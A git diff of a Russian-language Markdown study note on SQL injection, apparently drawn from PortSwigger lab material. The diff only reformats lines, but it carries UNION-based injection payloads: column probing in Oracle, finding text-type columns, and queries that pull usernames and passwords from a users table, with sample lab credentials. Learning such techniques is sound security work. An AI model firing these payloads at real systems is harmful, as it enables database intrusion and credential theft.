@@ -31,29 +31,30 @@ SQL-инъекция — это уязвимость веб-безопаснос
 
 ### 3.1 UNION-атака (определение колонок в Oracle)
 В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
-' UNION SELECT NULL FROM DUAL--
+- ' UNION SELECT NULL FROM DUAL--
 
 ### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL--
-' UNION SELECT NULL,NULL,NULL,'a'--
+- ' UNION SELECT 'a',NULL,NULL,NULL--
+- ' UNION SELECT NULL,'a',NULL,NULL--
+- ' UNION SELECT NULL,NULL,'a',NULL--
+- ' UNION SELECT NULL,NULL,NULL,'a'--<br>
+
 Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.
 
 ### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
-' UNION SELECT username, password FROM users--
+- ' UNION SELECT username, password FROM users--
 Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
 Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
 Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.
 
 ### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
-' UNION SELECT username || '~' || password FROM users--
-Результаты запроса содержат все имена пользователей и пароли, например:
-administrator~s3cure
-wiener~peter
-carlos~montoya
-В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.
-portswigger.net/web-security/sql-injection/cheat-sheet
+- ' UNION SELECT username || '~' || password FROM users--<br>
+Результаты запроса содержат все имена пользователей и пароли, например:<br>
+administrator~s3cure<br>
+wiener~peter<br>
+carlos~montoya<br>
+В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.<br>
+portswigger.net/web-security/sql-injection/cheat-sheet<br>
 
 ## 🔍 Анализ базы данных при SQL-инъекциях
 
